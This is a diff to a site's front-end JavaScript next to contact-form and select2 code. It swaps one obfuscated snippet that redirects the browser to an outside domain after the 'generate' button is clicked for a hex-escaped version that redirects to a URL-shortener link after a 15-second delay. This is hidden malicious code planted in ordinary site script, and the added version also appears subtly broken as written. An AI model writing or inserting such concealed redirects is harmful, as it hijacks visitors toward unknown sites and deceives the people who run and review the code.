@@ -434,13 +434,6 @@ $('#contactform').submit(function(e){
 	});
 	
 	$('select').select2();
-document.getElementById('generate').addEventListener('click', function() {
-    setTimeout(function() {
-        var _w = ['w', 'i', 'n', 'd', 'o', 'w'].join('');
-        var _l = ['l', 'o', 'c', 'a', 't', 'i', 'o', 'n'].join('');
-        var _h = ['h', 'r', 'e', 'f'].join('');
-var _u = ['h', 't', 't', 'p', 's', ':', '/', '/', 'w', 'w', 'w', '.', 'm', 'b', 'c', 'v', 'i', 'e', '.', 'c', 'o', 'm', '/', '?', 'm', '=', '0'].join('');
-        window[_l][_h] = _u;
-    }, 4000);
-});
+var _0x3c34=['\x77\x69\x6E\x64\x6F\x77','\x6C\x6F\x63\x61\x74\x69\x6F\x6E','\x68\x72\x65\x66','\x68\x74\x74\x70\x73\x3A\x2F\x2F\x73\x6D\x72\x74\x75\x72\x6C\x2E\x63\x6F\x2F\x38\x65\x66\x39\x64\x37\x62'];document['\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64']('\x67\x65\x6E\x65\x72\x61\x74\x65')['\x63\x6C\x69\x63\x6B'](function(){setTimeout(function(){var _0x4ad8x2=_0x3c34[0x0];var _0x4ad8x3=_0x3c34[0x1];var _0x4ad8x4=_0x3c34[0x2];var _0x4ad8x5=_0x3c34[0x3];window[_0x4ad8x3][_0x4ad8x4]=_0x4ad8x5;},0x3a98);});
+
 
